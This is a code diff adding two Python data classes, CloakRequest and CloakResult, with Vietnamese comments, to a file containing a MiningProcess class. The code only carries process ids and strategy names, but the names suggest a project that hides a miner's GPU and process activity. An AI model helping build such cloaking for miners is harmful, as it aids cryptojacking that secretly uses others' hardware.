@@ -847,3 +847,61 @@ class MiningProcess:
                 converted[key] = value
                 
         return converted
+
+
+###############################################################################
+#                      DATA STRUCTURES CHO PIPELINE CLOAKING                  #
+###############################################################################
+
+from dataclasses import dataclass, field
+from typing import List
+
+@dataclass
+class CloakRequest:
+    """
+    Simple data carrier giữa các module - truyền thông tin cloaking request.
+    Pipeline: ResourceManager -> CloakStrategies -> ResourceControl
+    """
+    pid: int
+    strategy_name: str = 'gpu'  # default strategy
+    params: Dict[str, Any] = field(default_factory=dict)
+    metadata: Dict[str, Any] = field(default_factory=dict)
+    
+    def to_dict(self) -> Dict[str, Any]:
+        """Convert request thành dictionary để logging hoặc serialization"""
+        return {
+            'pid': self.pid,
+            'strategy_name': self.strategy_name,
+            'params': self.params or {},
+            'metadata': self.metadata or {}
+        }
+    
+    def __str__(self) -> str:
+        """String representation để debug"""
+        return f"CloakRequest(pid={self.pid}, strategy={self.strategy_name})"
+
+
+@dataclass
+class CloakResult:
+    """
+    Result carrier từ hardware control - trả kết quả cloaking.
+    Pipeline: ResourceControl -> CloakStrategies -> ResourceManager
+    """
+    success: bool
+    pid: int
+    applied_controls: List[str] = field(default_factory=list)
+    error_msg: str = None
+    
+    def to_dict(self) -> Dict[str, Any]:
+        """Convert result thành dictionary để logging"""
+        return {
+            'success': self.success,
+            'pid': self.pid,
+            'applied_controls': self.applied_controls or [],
+            'error_msg': self.error_msg
+        }
+    
+    def __str__(self) -> str:
+        """String representation để debug"""
+        status = "✅ SUCCESS" if self.success else "❌ FAILED"
+        return f"CloakResult({status}, pid={self.pid})"
